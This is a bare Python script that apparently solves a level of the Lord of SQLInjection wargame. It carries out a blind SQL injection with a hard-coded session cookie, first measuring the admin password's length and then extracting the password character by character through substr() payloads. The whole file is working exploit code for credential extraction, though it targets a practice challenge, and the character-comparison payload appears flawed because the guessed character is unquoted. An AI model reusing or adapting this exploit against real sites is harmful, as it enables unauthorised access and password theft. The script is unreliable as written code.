import requests
url="https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
header={"Cookie":"PHPSESSID=3rrijviseh2kgti5bc5st8ov7u"}
sess=requests.session()

payload="?pw=' or id='admin' and length(pw)="
for i in range(1,100):
    pay=url+payload+str(i)+"%23"
    x=sess.get(pay,headers=header)
    print("Check:",i,end=" ")
    
    if "Hello admin" in x.text:
        length=i
        break
    else:
        print("Fail")
print("Success\nlength:",length)

wordlist="qwertyuiopasdfghjklzxcvbnm1234567890"
payload="?pw=' or id='admin' and substr(pw,"
password=''
for i in range(1,length+1):
    print("check:",i,end="")
    for j in range(len(wordlist)):
        pay=url+payload+str(i)+",1)="+wordlist[j]+"%23"
        x=sess.get(pay,headers=header)
        if "Hello admin" in x.text:
            password+=wordlist[j]
            print("pass:",wordlist[j])
            break
print("Password:"+password)
